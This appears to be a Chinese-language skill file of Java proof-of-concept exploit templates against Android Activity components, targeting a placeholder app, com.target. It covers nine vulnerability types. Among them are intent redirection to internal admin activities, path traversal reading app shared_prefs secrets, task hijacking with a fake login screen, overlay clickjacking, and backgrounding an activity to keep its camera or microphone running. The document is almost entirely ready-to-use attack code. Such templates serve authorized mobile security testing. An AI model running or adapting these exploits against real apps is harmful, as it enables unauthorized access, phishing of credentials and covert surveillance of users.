---
name: poc-app-activity
description: Activity 组件攻击 PoC — 覆盖导出越权、Intent 重定向、Fragment 注入、路径遍历等 9 种漏洞类型
---

# Activity 组件攻击 PoC

Activity 是最常见的攻击面。导出 Activity 可被任意应用启动，以下按漏洞类型分别给出 PoC 代码模板。

## 漏洞类型索引

| 漏洞 | 等级 | PoC 类名 |
|------|------|---------|
| 导出越权访问 | MEDIUM | `ActivityExportedAccessExploit` |
| Intent 重定向 | HIGH | `ActivityIntentRedirectExploit` |
| Fragment 注入 | MEDIUM | `ActivityFragmentInjectionExploit` |
| 路径遍历 | HIGH | `ActivityPathTraversalExploit` |
| PendingIntent 滥用 | HIGH | `ActivityPendingIntentAbuseExploit` |
| setResult 数据泄露 | MEDIUM | `ActivitySetResultLeakExploit` |
| Task 劫持 | MEDIUM | `ActivityTaskHijackExploit` |
| 点击劫持 | LOW | `ActivityClickjackingExploit` |
| 生命周期问题 | MEDIUM | `ActivityLifecycleExploit` |

## ActivityExportedAccessExploit

直接启动未设权限保护的导出 Activity，访问敏感功能。

```java
public class ActivityExportedAccessExploit extends Exploit {
    @Override
    public void execute() {
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.SensitiveActivity");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }
}
```

## ActivityIntentRedirectExploit

通过导出 Activity 转发嵌套 Intent 到内部非导出组件（LaunchAnyWhere）。

```java
public class ActivityIntentRedirectExploit extends Exploit {
    @Override
    public void execute() {
        // 构造嵌套 Intent，目标是内部非导出 Activity
        Intent forward = new Intent();
        forward.setClassName("com.target", "com.target.InternalAdminActivity");
        forward.putExtra("admin_cmd", "grant_permission");

        // 通过导出 Activity 转发
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.ForwardActivity");
        intent.putExtra("forward_intent", forward);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }
}
```

## ActivityFragmentInjectionExploit

注入任意 Fragment 类名到动态加载的 Activity。

```java
public class ActivityFragmentInjectionExploit extends Exploit {
    @Override
    public void execute() {
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.MainActivity");
        intent.putExtra("fragment", "com.target.AdminFragment");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }
}
```

## ActivityPathTraversalExploit

Activity 接收文件路径参数未做校验，通过 `../` 遍历读取任意文件。

```java
public class ActivityPathTraversalExploit extends Exploit {
    @Override
    public void execute() {
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.FileViewActivity");
        intent.putExtra("file_path", "../../../data/data/com.target/shared_prefs/secrets.xml");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }
}
```

## ActivityPendingIntentAbuseExploit

导出 Activity 执行从不可信来源获取的未标记 IMMUTABLE 的 PendingIntent。

```java
public class ActivityPendingIntentAbuseExploit extends Exploit {
    @Override
    public void execute() {
        // 1. 构造恶意 PendingIntent（模拟攻击者控制的场景）
        Intent maliciousIntent = new Intent();
        maliciousIntent.setClassName("com.target", "com.target.PrivilegedActivity");

        PendingIntent pendingIntent = PendingIntent.getActivity(
            context, 0, maliciousIntent, PendingIntent.FLAG_MUTABLE);

        // 2. 通过导出 Activity 触发执行
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.ExecutePendingIntentActivity");
        intent.putExtra("pending_intent", pendingIntent);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }
}
```

## ActivitySetResultLeakExploit

启动 Activity 并捕获 setResult 返回的敏感数据。

```java
public class ActivitySetResultLeakExploit extends Exploit {
    @Override
    public void execute() {
        // 需要通过 startActivityForResult 调用
        // 此处演示直接启动并观察 logcat 输出
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.ReturnDataActivity");
        intent.putExtra("request_type", "sensitive_info");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
        // 实际场景中需重写 onActivityResult 捕获返回数据
    }
}
```

## ActivityTaskHijackExploit

通过 taskAffinity 将恶意 Activity 注入目标 app 任务栈。

```java
public class ActivityTaskHijackExploit extends Exploit {
    @Override
    public void execute() {
        Intent intent = new Intent();
        intent.setClassName(context.getPackageName(), "com.poc.<target_app>.FakeLoginActivity");
        // 设置与目标相同的 taskAffinity
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        context.startActivity(intent);
    }
}
```

> 注意：恶意 Activity 需在 Manifest 中声明 `android:taskAffinity="com.target"` 和 `android:allowTaskReparenting="true"`。

## ActivityClickjackingExploit

通过悬浮窗覆盖目标 UI，诱导用户点击。

```java
public class ActivityClickjackingExploit extends Exploit {
    @Override
    public void execute() {
        // 需要 SYSTEM_ALERT_WINDOW 权限
        // 1. 启动目标 Activity
        Intent target = new Intent();
        target.setClassName("com.target", "com.target.PermissionActivity");
        target.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(target);

        // 2. 显示透明悬浮窗覆盖关键按钮
        // 需配合 Service 实现 WindowManager overlay
        Intent overlay = new Intent();
        overlay.setClassName(context.getPackageName(), "com.poc.<target_app>.OverlayService");
        context.startService(overlay);
    }
}
```

## ActivityLifecycleExploit

将持有敏感资源（摄像头/麦克风）的 Activity 推到后台，资源继续运行。

```java
public class ActivityLifecycleExploit extends Exploit {
    @Override
    public void execute() {
        // 1. 启动目标 Activity 激活摄像头/麦克风
        Intent camera = new Intent();
        camera.setClassName("com.target", "com.target.CameraActivity");
        camera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(camera);

        // 2. 短暂延迟后将目标推到后台
        new Handler().postDelayed(() -> {
            Intent home = new Intent(Intent.ACTION_MAIN);
            home.addCategory(Intent.CATEGORY_HOME);
            home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(home);
            log("Target pushed to background — check if camera is still active");
        }, 2000);
    }
}
```
